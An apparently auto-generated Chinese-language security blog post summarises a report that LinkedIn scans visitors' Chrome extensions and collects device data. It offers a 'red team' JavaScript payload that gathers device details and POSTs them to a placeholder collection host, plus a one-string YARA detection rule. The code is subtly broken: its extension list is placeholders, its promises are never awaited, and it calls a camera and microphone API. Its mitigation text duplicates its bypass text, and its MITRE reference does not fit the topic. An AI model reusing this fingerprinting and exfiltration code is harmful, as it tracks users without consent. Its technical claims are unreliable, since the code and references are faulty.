---
layout: post
title:  "LinkedIn secretely scans for 6,000+ Chrome extensions, collects data"
date:   2026-04-04 01:29:08 +0000
categories: [security]
severity: high
---

# 🔥 解析 LinkedIn 的隱藏 JavaScript 腳本：瀏覽器擴充功能掃描與設備資料收集

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 7.5)
> * **受駭指標**: Info Leak
> * **關鍵技術**: JavaScript Fingerprinting, Browser Extension Detection, Device Data Collection

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: LinkedIn 的網站注入了一個隱藏的 JavaScript 腳本，該腳本掃描訪問者的瀏覽器擴充功能，並收集設備資料。這個腳本使用了一種稱為「JavaScript Fingerprinting」的技術，通過檢查瀏覽器的特定屬性和行為來收集資訊。
* **攻擊流程圖解**:
	1. 訪問者訪問 LinkedIn 的網站。
	2. LinkedIn 的網站注入一個隱藏的 JavaScript 腳本。
	3. 腳本掃描訪問者的瀏覽器擴充功能，並收集設備資料。
	4. 腳本將收集到的資訊傳回給 LinkedIn 的伺服器。
* **受影響元件**: LinkedIn 的網站、Chrome 瀏覽器、各種瀏覽器擴充功能。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 訪問者必須訪問 LinkedIn 的網站，並且具有 Chrome 瀏覽器。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // 範例 Payload
    const extensionIds = [
      'extension1',
      'extension2',
      // ...
    ];
    
    const deviceData = {
      cpuCoreCount: navigator.hardwareConcurrency,
      availableMemory: navigator.deviceMemory,
      screenResolution: `${screen.width}x${screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      languageSettings: navigator.language,
      batteryStatus: navigator.getBattery(),
      audioInformation: navigator.mediaDevices.getUserMedia(),
      storageFeatures: navigator.storage,
    };
    
    // 傳回收集到的資訊
    fetch('https://example.com/collect', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        extensionIds,
        deviceData,
      }),
    });
    
    ```
* **繞過技術**: 可以使用瀏覽器擴充功能來阻止 LinkedIn 的腳本執行，或者使用 VPN 來隱藏設備資料。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
|  |  | linkedin.com |  |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule LinkedIn_Fingerprinting {
      meta:
        description = "Detects LinkedIn's fingerprinting script"
      strings:
        $script = "extensionIds" ascii
      condition:
        $script
    }
    
    ```
* **緩解措施**: 可以使用瀏覽器擴充功能來阻止 LinkedIn 的腳本執行，或者使用 VPN 來隱藏設備資料。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **JavaScript Fingerprinting**: 一種技術，通過檢查瀏覽器的特定屬性和行為來收集資訊。
* **Browser Extension Detection**: 一種技術，通過檢查瀏覽器的擴充功能來收集資訊。
* **Device Data Collection**: 一種技術，通過收集設備資料來收集資訊。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/linkedin-secretely-scans-for-6-000-plus-chrome-extensions-collects-data/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1056/)


